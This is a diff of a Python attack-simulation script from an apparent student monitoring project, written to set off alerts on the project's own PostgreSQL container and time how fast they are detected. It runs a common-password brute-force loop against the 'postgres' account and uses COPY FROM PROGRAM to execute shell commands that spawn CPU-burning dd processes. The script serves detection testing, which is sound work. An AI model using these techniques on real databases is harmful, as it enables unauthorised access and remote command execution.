@@ -1,51 +1,46 @@
 """
-DB Brute Force Attack (Internal Network)
-시나리오 2-D
+DB Brute Force + RCE Attack Simulation
+시나리오 2-D (재설계)
 
-공격 전략 2계층:
-  [1] docker exec pg_sleep: 100개 동시 연결 점유 → HighPostgresConnections (>50) alert
-  [2] 임시 공격 컨테이너 (TCP): leafy-db:5432 TCP 접속으로 wrong password 반복
-      → PostgreSQL 로그에 'FATAL: password authentication failed' 기록 → Loki 수집
+1단계 run_bruteforce():
+  postgres 계정으로 패스워드 리스트 순환 브루트포스 (100회 반복)
+  → PostgreSQL 로그에 'password authentication failed' 기록 → Loki 수집
 
-탐지 소스:
-  - Prometheus: pg_stat_activity_count > 50 (HighPostgresConnections)
-  - Loki (container=leafy-db): 반복 인증 실패 패턴
+2단계 run_rce():
+  leafy 계정(superuser)으로 COPY FROM PROGRAM 악용
+  → 컨테이너 내부 CPU 점유 프로세스 기동 → HighCpuUsage alert
 
-AIOps 포인트: 단순 연결 풀 고갈(N+1)과 반복 인증 실패(브루트포스)를
-             Loki 에러 패턴으로 구별
+두 함수는 독립적으로 import 가능.
 """
 
 import json
 import os
-import random
 import subprocess
-import time
-import urllib.parse
-import urllib.request
-from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime, timezone
 import sys
 import threading
+import time
+from datetime import datetime, timezone
+
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 from common.verifier import ScenarioVerifier
 
 # ── 설정 ───────────────────────────────────────────────────────────────────────
-SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
-LOG_PATH     = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_PATH   = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))
 
 DB_CONTAINER   = os.getenv("DB_CONTAINER", "leafy-db")
 DB_NAME        = os.getenv("DB_NAME", "leafy")
 DB_USER        = os.getenv("DB_USER", "leafy")
 LEAFY_NETWORK  = os.getenv("LEAFY_NETWORK", "graduation-project_leafy-net")
-ATTACKER_NAME  = "leafy-brute-attacker"
 POSTGRES_IMAGE = "postgres:15-alpine"
+ATTACKER_NAME  = "leafy-brute-attacker"
 
-HOLD_WORKERS   = 100   # docker exec pg_sleep → pg_stat_activity spike
-HOLD_SLEEP_SEC = 30    # 연결 유지 시간 (Prometheus 스크랩 간격보다 충분히 길게)
-DURATION_SEC   = 120   # 전체 공격 지속 시간(초)
-ATTACK_COUNT   = 300   # TCP 인증 실패 시도 횟수
-
-PROM_URL = os.getenv("PROM_URL", "http://localhost:9090")
+BRUTE_PASSWORDS = [
+    "112233", "1q2w3e4r", "postgres", "postgres123",
+    "admin", "password", "123456", "test", "qwerty", "letmein",
+]
+BRUTE_ITERATIONS = 100   # 패스워드 리스트 순환 반복 횟수
+RCE_DURATION_SEC = 300   # CPU 점유 지속 시간(초)
 
 
 # ── 로그 유틸 ──────────────────────────────────────────────────────────────────
@@ -55,12 +50,14 @@ def _load_log() -> list:
             return json.load(f)
     return []
 
+
 def _save_log(records: list) -> None:
     os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
     with open(LOG_PATH, "w", encoding="utf-8") as f:
         json.dump(records, f, indent=2, ensure_ascii=False)
 
-def record_event(scenario, start, end, status, detail=""):
+
+def record_event(scenario: str, start: str, end: str, status: str, detail: str = "") -> None:
     records = _load_log()
     records.append({
         "scenario": scenario, "category": "security",
@@ -71,96 +68,43 @@ def record_event(scenario, start, end, status, detail=""):
     print(f"[LOG] {scenario} | {status} | {start} → {end}")
 
 
-# ── Prometheus 조회 ────────────────────────────────────────────────────────────
-def _query_prometheus(query: str) -> str:
-    try:
-        url = f"{PROM_URL}/api/v1/query?" + urllib.parse.urlencode({"query": query})
-        with urllib.request.urlopen(url, timeout=5) as resp:
-            data = json.loads(resp.read())
-        results = data.get("data", {}).get("result", [])
-        if not results:
-            return "0 (no data)"
-        # state별 시리즈가 여러 개일 경우 모두 출력
-        if len(results) == 1:
-            return results[0]["value"][1]
-        return ", ".join(
-            f'{r.get("metric", {}).get("state", "?")}={r["value"][1]}'
-            for r in results
-        )
-    except Exception as e:
-        return f"N/A ({e})"
-
-
-def _print_pg_stat_variants():
-    """alert 임계값 진단: pg_stat_activity 관련 메트릭 이름별 현재값 출력."""
-    variants = [
-        "pg_stat_activity_count",
-        'sum(pg_stat_activity_count)',
-        'pg_stat_activity_count{state="active"}',
-        'pg_stat_activity_count{state="idle"}',
-    ]
-    print("[진단] pg_stat_activity 메트릭 현재값 (alert 임계값: 50)")
-    for q in variants:
-        print(f"  {q} = {_query_prometheus(q)}")
-
-
-def _monitor_pg_stat(stop_event: threading.Event):
-    """연결 점유 중 5초마다 Prometheus에서 pg_stat_activity_count 실시간 출력."""
-    while not stop_event.wait(5):
-        val = _query_prometheus("pg_stat_activity_count")
-        print(f"  [실시간] pg_stat_activity_count = {val}  (임계값: 50)")
-
-
 # ── 컨테이너 정리 ──────────────────────────────────────────────────────────────
-def _cleanup():
+def _cleanup_attacker() -> None:
     subprocess.run(["docker", "rm", "-f", ATTACKER_NAME], capture_output=True)
 
 
-# ── 연결 점유 워커 (docker exec, trust auth, pg_sleep) ─────────────────────────
-def _hold_connection() -> bool:
-    cmd = [
-        "docker", "exec", DB_CONTAINER,
-        "psql", "-U", DB_USER, "-d", DB_NAME,
-        "-c", f"SELECT pg_sleep({HOLD_SLEEP_SEC})",
-        "-t", "--no-align",
-    ]
-    try:
-        r = subprocess.run(cmd, capture_output=True, timeout=HOLD_SLEEP_SEC + 5)
-        return r.returncode == 0
-    except Exception:
-        return False
-
-
-# ── TCP 인증 실패 공격 (임시 컨테이너, scram-sha-256 auth) ─────────────────────
-def _run_tcp_attack():
+# ── 1단계: 브루트포스 ──────────────────────────────────────────────────────────
+def run_bruteforce() -> None:
     """
-    임시 컨테이너를 leafy-net에 띄워 TCP로 leafy-db:5432 인증 실패 반복.
-    docker exec (unix socket, trust auth)와 달리 TCP 연결은 scram-sha-256 인증 적용.
-    PostgreSQL 로그: FATAL: password authentication failed for user "leafy"
+    postgres 계정으로 패스워드 리스트를 순환하며 브루트포스.
+    BRUTE_ITERATIONS회 반복, 항상 인증 실패
+    → PostgreSQL 로그에 'password authentication failed' 기록.
     """
-    wrong_passwords = [
-        "admin", "admin123", "password", "qwerty", "123456",
-        "wrongpass", "leafy", "leafy123", "secret", "postgres",
-        "letmein", "passw0rd", "12345678", "abc123", "monkey",
-    ]
+    scenario   = "db_bruteforce"
+    start_time = datetime.now(timezone.utc).isoformat()
 
-    attempts = " ".join([
-        f'PGPASSWORD="{p}" psql -h {DB_CONTAINER} -U {DB_USER} -d {DB_NAME} '
+    print(f"[*] 1단계: 브루트포스 시작")
+    print(f"[*] 대상: postgres 계정 @ {DB_CONTAINER}:5432")
+    print(f"[*] 패스워드 {len(BRUTE_PASSWORDS)}개 × {BRUTE_ITERATIONS}회 = "
+          f"{len(BRUTE_PASSWORDS) * BRUTE_ITERATIONS}회 시도 (전부 실패)")
+
+    attempts_cmds = " ".join(
+        f'PGPASSWORD="{p}" psql -h {DB_CONTAINER} -U postgres -d postgres '
         f'-c "SELECT 1" -t --no-align 2>&1 || true;'
-        for p in wrong_passwords
-    ])
-
+        for p in BRUTE_PASSWORDS
+    )
     script = f"""#!/bin/sh
-echo "[brute-attacker] TCP brute force 시작: {DB_CONTAINER}:5432"
-attempt=0
-while [ $attempt -lt {ATTACK_COUNT} ]; do
-  attempt=$((attempt+1))
-  {attempts}
-  sleep 0.2
+echo "[brute] 시작: {DB_CONTAINER}:5432 postgres 계정"
+i=0
+while [ $i -lt {BRUTE_ITERATIONS} ]; do
+  i=$((i+1))
+  {attempts_cmds}
+  echo "[brute] 반복 $i/{BRUTE_ITERATIONS} 완료"
 done
-echo "[brute-attacker] 완료: $attempt 회 시도"
+echo "[brute] 종료: $i × {len(BRUTE_PASSWORDS)} = $((i * {len(BRUTE_PASSWORDS)}))회 시도"
 """
 
+    _cleanup_attacker()
     cmd = [
         "docker", "run", "--rm",
         "--name", ATTACKER_NAME,
@@ -169,88 +113,115 @@ echo "[brute-attacker] 완료: $attempt 회 시도"
         "sh", "-c", script,
     ]
     try:
-        subprocess.run(cmd, capture_output=True, timeout=DURATION_SEC + 30)
-    except Exception:
-        pass
+        proc = subprocess.run(cmd, capture_output=True, timeout=BRUTE_ITERATIONS * 15)
+        status = "success" if proc.returncode == 0 else f"exit_code={proc.returncode}"
+        output = proc.stdout.decode("utf-8", errors="replace")
+        if output.strip():
+            print(output.strip())
+    except subprocess.TimeoutExpired:
+        print("[!] 브루트포스 타임아웃 — 컨테이너 정리")
+        status = "timeout"
+    except Exception as e:
+        print(f"[!] 브루트포스 실패: {e}")
+        status = "error"
     finally:
-        _cleanup()
+        _cleanup_attacker()
+
+    end_time = datetime.now(timezone.utc).isoformat()
+    record_event(scenario, start_time, end_time, status,
+                 f"iterations={BRUTE_ITERATIONS}, passwords={len(BRUTE_PASSWORDS)}")
+    print(f"[*] 1단계 완료: {status}")
 
 
-# ── 메인 ───────────────────────────────────────────────────────────────────────
-def main():
-    scenario   = "db_bruteforce"
+# ── 2단계: RCE (COPY FROM PROGRAM) ────────────────────────────────────────────
+def run_rce() -> None:
+    """
+    leafy 계정(superuser)으로 COPY FROM PROGRAM을 악용해 CPU 점유 프로세스 기동.
+    HighCpuUsage alert 발화 확인 후 RCE_DURATION_SEC 초 대기, dd 프로세스 정리.
+    """
+    scenario   = "db_rce_cpu"
+    start_time = datetime.now(timezone.utc).isoformat()
+
     verifier = ScenarioVerifier(
-        scenario_name="db_bruteforce",
-        alert_name="HighPostgresConnections",
-        hypothesis="DB 브루트포스 공격 중 HighPostgresConnections FIRING",
-        steady_state_query='pg_stat_activity_count',
-        steady_state_threshold=50.0,
+        scenario_name="db_rce_cpu",
+        alert_name="HighCpuUsage",
+        hypothesis="COPY FROM PROGRAM으로 CPU 점유 → HighCpuUsage FIRING",
+        steady_state_query=(
+            'sum(irate(container_cpu_usage_seconds_total'
+            '{id=~"/docker/.+",cpu="total"}[30s]))'
+        ),
+        steady_state_threshold=0.5,
+        metric_label="현재 CPU",
+        metric_unit="%",
+        metric_scale=100.0,
     )
     verifier.check_steady_state()
     verifier.print_hypothesis()
-    verifier.check_repeat_interval()
+    verifier.wait_for_alert_inactive()
+
+    def _psql(sql: str) -> tuple[int, str]:
+        cmd = [
+            "docker", "exec", DB_CONTAINER,
+            "psql", "-U", DB_USER, "-d", DB_NAME,
+            "-c", sql, "-t", "--no-align",
+        ]
+        r = subprocess.run(cmd, capture_output=True, timeout=30)
+        return r.returncode, r.stdout.decode("utf-8", errors="replace").strip()
+
+    print(f"[*] 2단계: RCE 시작 (COPY FROM PROGRAM)")
+    print(f"[*] 대상: {DB_CONTAINER} / 계정: {DB_USER} (superuser)")
+
+    # 테이블 준비
+    for sql in [
+        "DROP TABLE IF EXISTS abroxu;",
+        "CREATE TABLE abroxu(cmd_output text);",
+    ]:
+        rc, out = _psql(sql)
+        print(f"  → {sql.split()[0]} {'OK' if rc == 0 else f'FAIL(rc={rc})'}")
+
+    # CPU 점유 프로세스 기동
+    cpu_stress_sql = (
+        "COPY abroxu FROM PROGRAM "
+        "'for i in $(seq 1 $(nproc)); do dd if=/dev/zero of=/dev/null bs=1M & done';"
+    )
+    rc, out = _psql(cpu_stress_sql)
+    print(f"  → COPY FROM PROGRAM {'OK — dd 프로세스 기동' if rc == 0 else f'FAIL(rc={rc})'}")
+
     verifier.start_timer()
-    start_time = datetime.now(timezone.utc).isoformat()
-    deadline   = time.time() + DURATION_SEC
 
-    print(f"[*] 시나리오: DB Brute Force (내부망 반복 인증 실패)")
-    print(f"[*] 연결 점유 ({HOLD_WORKERS}×pg_sleep) → HighPostgresConnections (>50)")
-    print(f"[*] TCP 인증 실패 ({ATTACK_COUNT}회) → Loki 'password authentication failed'")
-    print(f"[*] 사전 정리...")
-    _cleanup()
+    # Alert 발화 확인 + MTTA 병렬 측정
+    result = verifier.verify(timeout=RCE_DURATION_SEC + 60, poll_interval=3)
 
-    # TCP 브루트포스 공격을 백그라운드 스레드로 실행
-    attack_thread = threading.Thread(target=_run_tcp_attack, daemon=True)
-    attack_thread.start()
-    print(f"[*] TCP 공격 컨테이너 기동 중...")
-    time.sleep(3)
+    # dd 프로세스 정리
+    print(f"[*] dd 프로세스 정리 중...")
+    try:
+        subprocess.run(
+            ["docker", "exec", DB_CONTAINER, "pkill", "-f", "dd"],
+            capture_output=True, timeout=10,
+        )
+    except Exception as e:
+        print(f"  [!] pkill 실패 (무시): {e}")
 
-    # 연결 점유 시작 전 Prometheus 현재값 및 메트릭 이름 진단
-    _print_pg_stat_variants()
+    # 임시 테이블 정리
+    rc, _ = _psql("DROP TABLE IF EXISTS abroxu;")
+    print(f"  → DROP TABLE {'OK' if rc == 0 else f'FAIL(rc={rc})'}")
 
-    # 연결 점유 워커로 pg_stat_activity spike
-    print(f"[*] 연결 점유 시작 ({HOLD_WORKERS}개 동시, {HOLD_SLEEP_SEC}s 유지)...")
-    total_holds = 0
-
-    stop_monitor = threading.Event()
-    monitor_thread = threading.Thread(target=_monitor_pg_stat, args=(stop_monitor,), daemon=True)
-    monitor_thread.start()
-
-    with ThreadPoolExecutor(max_workers=HOLD_WORKERS) as pool:
-        while time.time() < deadline:
-            futures = [pool.submit(_hold_connection) for _ in range(HOLD_WORKERS)]
-            for f in futures:
-                try:
-                    if f.result(timeout=HOLD_SLEEP_SEC + 6):
-                        total_holds += 1
-                except Exception:
-                    pass
-            elapsed = int(time.time() - (deadline - DURATION_SEC))
-            print(f"  → 연결 점유: {total_holds}회 | 경과: {elapsed}s / {DURATION_SEC}s")
-
-    stop_monitor.set()
-    monitor_thread.join(timeout=6)
-
-    attack_thread.join(timeout=5)
     end_time = datetime.now(timezone.utc).isoformat()
-
-    detail = json.dumps({
-        "hold_connections": total_holds,
-        "attack_count":     ATTACK_COUNT,
-        "hold_workers":     HOLD_WORKERS,
-        "network":          LEAFY_NETWORK,
-        "note": "hold(docker exec pg_sleep) + TCP attack(임시 컨테이너, scram-sha-256)",
-    }, ensure_ascii=False)
-
-    record_event(scenario, start_time, end_time, "success", detail)
-    result = verifier.verify(timeout=180)
-    mtta = verifier.verify_mtta(timeout=180)
-    result.mtta_seconds = mtta
-    result.slack_notified = mtta is not None
+    record_event(scenario, start_time, end_time,
+                 "success" if result.success else "failed",
+                 json.dumps({"mttd": result.mttd_seconds, "mtta": result.mtta_seconds},
+                            ensure_ascii=False))
     verifier.log_result(result)
-    print(f"\n[*] 완료: 연결 점유 {total_holds}회")
-    print(f"[*] Loki: container=leafy-db → 'password authentication failed'")
-    print(f"[*] Prometheus: HighPostgresConnections alert")
+    print(f"[*] 2단계 완료")
+
+
+# ── 메인 ───────────────────────────────────────────────────────────────────────
+def main() -> None:
+    print("[*] === DB Brute Force + RCE 시나리오 시작 ===")
+    run_bruteforce()
+    print()
+    run_rce()
+    print("[*] === 시나리오 종료 ===")
 
 
 if __name__ == "__main__":
